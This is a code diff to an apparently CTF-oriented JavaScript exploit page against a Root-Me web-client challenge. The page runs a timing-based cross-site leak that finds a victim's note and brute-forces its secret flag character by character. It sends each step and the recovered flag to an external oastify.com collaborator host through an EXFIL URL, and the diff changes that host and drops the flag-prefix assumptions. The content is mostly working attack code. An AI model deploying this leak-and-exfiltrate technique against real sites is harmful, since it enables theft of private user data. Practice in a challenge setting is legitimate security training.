@@ -9,7 +9,7 @@
     <script>
         // ── CONFIG ──────────────────────────────────────────────────────────────
         const BASE_URL   = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
-        const EXFIL      = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/?data=";
+        const EXFIL      = "http://c6jebfw4342upnf3c2zfoga2zt5ktch1.oastify.com/?data=";
         const ALPHABET   = "abcdefghijklmnopqrstuvwxyz0123456789_{}";
 
         // Timing thresholds – tune these based on what the server actually returns.
@@ -81,11 +81,9 @@
          * Adjust buildScanUrl() below to match.
          */
         function buildScanUrl(id) {
-            // Pattern A – testing note existence with an empty prefix
-            // A slow response here means the note exists AND is "special".
-            // If ALL notes respond slowly just for existing, you need a known-prefix
-            // like the flag wrapper, e.g.: return BASE_URL + id + "/rm{";
-            return BASE_URL + id + "/rm{";
+            // No flag format wrapper — probe the bare note URL.
+            // A slow response means this note contains the flag content.
+            return BASE_URL + id + "/";
         }
 
         function buildFlagUrl(id, prefix) {
@@ -130,9 +128,9 @@
 
         // ── PHASE 2: BRUTE-FORCE THE FLAG ───────────────────────────────────────
         async function bruteForceFlag(noteId) {
-            let flag = "rm{"; // common Root-Me flag prefix
+            let flag = ""; // no flag format — start from scratch
             exfil("BRUTE_START_NOTE_" + noteId);
-            log(`[Phase 2] Brute-forcing flag on note ${noteId}, prefix: "${flag}"`);
+            log(`[Phase 2] Brute-forcing flag on note ${noteId}, starting from empty prefix...`);
 
             while (true) {
                 let found = false;
@@ -162,12 +160,7 @@
                     break;
                 }
 
-                // Safety: stop if flag looks complete
-                if (flag.endsWith("}")) {
-                    exfil("FLAG_DONE_" + flag);
-                    log(`[Phase 2] 🏁 Flag extracted: "${flag}"`);
-                    break;
-                }
+                // No closing brace to detect — loop stops when no char matches
             }
             return flag;
         }
